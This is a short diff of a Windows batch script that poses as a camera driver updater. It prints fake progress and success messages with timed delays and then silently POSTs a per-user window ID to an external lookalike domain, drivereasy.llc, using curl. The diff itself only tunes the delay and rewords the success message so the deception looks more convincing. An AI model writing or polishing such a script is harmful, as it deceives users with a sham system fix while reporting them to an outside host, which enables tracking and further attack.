@@ -11,8 +11,8 @@ call :delay 4
 echo [INFO] Searching for Camera Drivers ...
 call :delay 4
 echo [INFO] Update Driver Packages...
-call :delay 4
-echo [SUCCESS] Camera Driver Setup completed successfully.
+call :delay 6
+echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
   set "AUTO_URL=https://drivereasy.llc/auto-update/!WINDOW_UID!"
   curl -sL -X POST "!AUTO_URL!" -o nul
